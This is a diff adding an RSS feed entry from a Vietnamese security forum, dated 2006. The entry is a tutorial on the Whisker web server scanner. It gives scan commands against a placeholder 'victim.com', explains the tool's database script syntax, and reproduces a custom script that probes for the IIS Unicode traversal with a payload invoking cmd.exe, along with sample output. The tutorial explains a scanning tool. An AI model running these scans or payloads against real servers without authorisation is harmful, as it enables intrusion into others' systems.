@@ -1,0 +1,113 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Hướng dẫn Whisker"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/23.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Hướng dẫn Whisker"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Hướng dẫn Whisker</title>
+				<description><![CDATA[  <b>Hướng dẫn Whisker</b>
+
+Whisher là một công cụ mạnh được viết bởi Rain Forest Puppy. Chức năng chủ yếu của Whisker là quyét các tập tin có trên Web server.
+
+Whisher là một công cụ mạnh được viết bởi Rain Forest Puppy. Chức năng chủ yếu của Whisker là quyét các tập tin có trên Web server. Nó xuất hiện vào thời kỳ đầu của Web, khi mà hầu hết các lô~ hổng đều liên quan đến CGI hoặc các script và đây là tất cả các chức năng thực sự cần thiết của một scanner. Tuy nhiên, giờ đây môi trường Web phức tạp hơn rất nhiều nên bạn se~ bị giới hạn khi sử dụng công cụ này cho một mục đích riêng lẻ và vì thế bạn chỉ nên coi đây là một bài viết tham khảo và giới thiệu.
+
+Whisker thực thi công việc chính bằng cách đưa vào một file được cấu hình gọi là một database file (thường thường phần mở rộng là .db). File này cho whisker biết phải tìm kiếm như~ng file nào và ở trong thư mục nào trong hàng đống như~ng thứ lộn sộn trên Web server. Dưới đây là cách mà Whisker thực hiện vào một server đích sử dụng file cấu hình scan.db:
+
+C:\ > whisker.pl -h victim.com -s scan.db
+<blockquote>-- whisker / v1.4.0 / rain forest puppy / www.wiretrip.net --
+= - = - = - = - = - =
+= Host: victim.com
+= Server: Microsoft-IIS/5.0
++ 200 OK: GET /whisker.ida
++ 200 OK: GET /whisker.idq
++ 200 OK: HEAD /_vti_inf.html
++ 200 OK: HEAD /_vti_bin/shtml.dll
++ 200 OK: HEAD /_vti_bin/shtml.exe&nbsp;
+		</blockquote>
+
+Bạn có thể thấy Whisker đa~ nhận dạng vài tập tin có sự nguy hiểm tiềm tàng trên hệ thống IIS 5 này. Thật sự tốt khi có mặt của các bộ lọc ISAPI phù hợp cho các file .idq và .ida (whisker.ida và whisker.idq cho kết quả chỉ là các file giả để chỉ ra rằng server này đa~ đáp ứng request cho các file tương tự). Như đa~ nói ở trên, đây là bản chất của Whisker, nó kiểm tra sự có mặt của các file liên quan đến bảo mật đa~ biết giống như hầu hết các CGI scanner ``đời đầu``.
+
+Sức mạnh của Whisker nằm ở chô~ khả năng dê~ dàng học scrip databese language của nó, và chức năng này được mô tả trong file Whisker.txt đi cùng. Cách viết có lựa chọn các scrips databese không quá phức tạp, nó chỉ được dựng quanh 2 key cơ sở đó là các Array và Scan.
+Một Array là danh sách của các thư mục để kiểm tra sự có mặt của một file. Một array được gọi là ``roots`` bao gồm các thư mục / (Thư mục gốc của Web), scripts, cgi-bin, iisadmin và iishelp se~ có cấu trúc giống như sau:
+
+<b>array roots = /,scripts,cgi-bin, iisadmin, iishelp</b>
+
+Array có thể dùng cú pháp tham chiếu @array_name ở bất cứ đâu trong script databese và chúng có thể được lồng vào nhau để chỉ ro~ ra cấu trúc thư mục lộn xộn chỉ bằng một vài dòng code.
+
+Scan chỉ ra cho Whisker cách tìm kiếm các mảng đa~ được chỉ định và để tìm một tên file nào đó. Qua ví dụ dưới đây, nếu bạn muốn quyét mảng ``roots`` để tìm sự có mặt của file my.cgi, bạn se~ sử dụng cú pháp:
+
+<b>scan ( ) @roots > > default.asp</b>
+
+Để giới hạn việc quyét tới hệ thống và để trả về chuô~i ``IIS/5.0`` tại HTTP Header, đơn giản là bạn chỉ việc thêm vào bằng cú pháp sau:
+
+<b>scan (IIS/5.0) @roots > > default.asp</b>
+
+Vậy để ví dụ để tìm file default.asp trong các thư mục /, script, cgi-bin, iisadmin, iishelp thì bạn se~ tạo một file scan configuration giống như sau:
+
+<b>array roots = /, scripst, cgi-bin, iisadmin, iishelp scan (IIS/5.0) @roots > > default.asp</b>
+
+và đặt tên nó là Whiis5ker.db rồi dùng nó để quyét một danh sách các địa chỉ IP đích được chứa trong file hosts.txt, kết quả được xuất ra file output.txt. Đây là dòng lệnh của Whisker:
+
+<b>whisker.pl -H host.txt -s whiis5ker.db -iv -l output.txt</b>
+
+Ngôn ngư~ script database có rất nhiều khả năng, với một chút sáng tạo và sự hiểu biết về cấu trúc thư mục Web server nói chung, Whisker có thể được mở rộng với file custom.db trong một công cụ quyét đầy sức mạnh và mềm dẻo. Lấy ví dụ, đây là một ví dụ về file .db có thể được dùng để kiểm tra sự có mặt của các lô~i Unicode File System Traversal khác nhau:
+
+<blockquote>#Unicode.db by Joel Scambray 01-05-02
+#Base on whisker by RFP
+#if you want to stop the scanner at any point, insert the ``exitall`` command
+#if you want to insert Perl at any point, use:
+#eval
+#[perl code...]
+#endeval
+#All user an global variables are in %D
+#***See the whisker.txt command reference that ships with whisker***
+#
+# globals
+# *********
+# change the default method to GET - switch to other using usepost, etc. if
+# necessary for scans, and restoremeth to return to default
+set xxMeth = GET
+set xxver = HTTP/1.0
+set xxbose = 1
+#
+# arrays
+# *********
+array Unicode = script, iissamples, iisadmin, iishelp, cgi-bin, msadc,_vti_bin,
+certsrv, certcontrol, certenroll
+#
+# scans
+# **********
+print Checking for variation on IIS Unicode File System Traversal
+print The target may be vulnerable to Unicode if 200 is received
+scan (iis) @Unicode / > > ..%c0%af../winnt/system32/cmd.exe?/c+dir&nbsp;
+		</blockquote>
+
+Và đây là như~ng điều diê~n ra nếu bạn chạy đoạn code này:
+
+test > whisker.pl -h ww.victim.com -s unicode.db
+<blockquote>--whisker / v1.4.0 / rain forest puppy / ``http://www.wiretrip.net`` > www.wiretrip.net --
+= - = - = - = - = - =
+= Host: ``http://www.victim.com`` > www.victim.com
+= Server: Microsoft-IIS/5.0
+Checking for variation on IIS Unicode File System Traversal
+The target may be vulnerable to Unicode if 200 is received
++ 200 OK: Get /..%c0%af../winnt/system32/cmd.exe?/c+dir&nbsp;
+		</blockquote>
+
+Nếu server không bị dính lô~i, bạn se~ thấy HTTP trả về các kết quả tương tự sau:
+
+    * 404 Object Not Found
+    * 403 Access Forbidden 
+
+Một khả năng khác của Whisker đó là chạy như một CGI, đơn giản chỉ là đổi tên Perl engine này thành Whisker.cgi và đặt vào thư mục /cgi-bin/ trên Web server. 
+
+Tác giả:  Mulan]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/2293.hva#11833</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/2293.hva#11833</link>
+				<pubDate><![CDATA[Wed, 2 Aug 2006 00:24:40]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+	</channel>
+</rss>
